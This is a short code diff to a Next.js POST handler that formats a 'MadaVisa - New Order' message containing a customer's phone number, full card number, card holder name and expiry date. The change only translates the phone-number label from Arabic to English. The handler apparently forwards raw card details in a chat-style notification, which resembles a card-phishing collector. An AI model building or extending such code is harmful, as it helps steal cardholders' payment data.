@@ -28,7 +28,7 @@ export async function POST(req: NextRequest) {
     ``,
     `🏦 MadaVisa - New Order`,
     `🙍 Order For: ${ltr}${customer ?? "-"}`,
-    `📱 رقم الجوال: ${ltr}${whatsapp ?? "-"}`,
+`📱 Phone Number: ${ltr}${whatsapp ?? "-"}`,
     `🪪 Card Number: ${ltr}${cardNumber}`,
     `✍️ Card Holder: ${ltr}${cardHolder}`,
     `📆 Valid To: ${ltr}${expiry}`,
